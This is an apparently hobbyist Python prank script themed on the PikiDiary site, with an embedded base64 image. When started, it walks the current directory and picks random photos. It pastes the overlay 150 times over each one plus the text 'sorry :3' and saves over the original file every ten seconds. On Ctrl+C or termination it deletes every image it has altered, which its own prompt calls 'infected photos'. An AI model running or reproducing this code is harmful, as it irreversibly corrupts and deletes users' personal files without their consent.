# this code sucks so feel free to fork and make better rgeg
# pikidiary is owned by jax and graybox, i don't own piki and this is just for fun rgehg
# Squirrel - 2/7/25

import os
import random
import time
import base64
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import signal

GREG = []
WOW = """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"""



def peak():
    images = []
    for root, _, files in os.walk(os.getcwd()):
        for f in files:
            if f.lower().endswith(('png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'jfif')):
                images.append(os.path.join(root, f))
    return random.choice(images) if images else None


def wow():
    image_data = base64.b64decode(WOW)
    overlay = Image.open(BytesIO(image_data)).convert("RGBA")
    overlay = overlay.resize((overlay.width // 2, overlay.height // 2))
    return overlay


def greg(background_path):
    try:
        bg = Image.open(background_path).convert("RGBA")
    except IOError:
        print(f"couldn't peak: {background_path}")
        return
    overlay = wow()
    overlay_width, overlay_height = overlay.size
    bg_width, bg_height = bg.size

    total_embeds = 0
    while total_embeds < 150:
        x = random.randint(-overlay_width, bg_width)
        y = random.randint(-overlay_height, bg_height)
        bg.paste(overlay, (x, y), overlay)
        total_embeds += 1

    draw = ImageDraw.Draw(bg)
    try:
        font = ImageFont.truetype("C:\\Windows\\Fonts\\comic.ttf", 40)
    except IOError:
        font = ImageFont.load_default()
    
    text = "sorry :3"
    text_bbox = draw.textbbox((0, 0), text, font=font)
    text_width, text_height = text_bbox[2] - text_bbox[0], text_bbox[3] - text_bbox[1]
    draw.text(((bg.width - text_width) // 2, (bg.height - text_height) // 2), text, font=font, fill=(255, 255, 255, 255))

    bg.save(background_path)
    GREG.append(background_path)
    print("Sorry :3")


def delete_greg(signum, frame):
    for image_path in GREG:
        if os.path.exists(image_path):
            os.remove(image_path)
    print("bye :3")
    exit()


def main():
    signal.signal(signal.SIGINT, delete_greg)
    signal.signal(signal.SIGTERM, delete_greg)
    print("say exit to exit program, say start to start, press \"ctrl + c\" to stop in process g (IF YOU DO THIS, THE INFECTED PHOTOS WILL BE DELETED. JUST CLOSE OR KILL THE TERMINAL.)")
    ok = input().lower()

    while True:
        if ok == "exit":
            print("bye :3")
            exit()
        if ok == "start":
            bg = peak()
            if bg:
                greg(bg)
            time.sleep(10)
        else:
            print("ghreh")
            exit()

main()
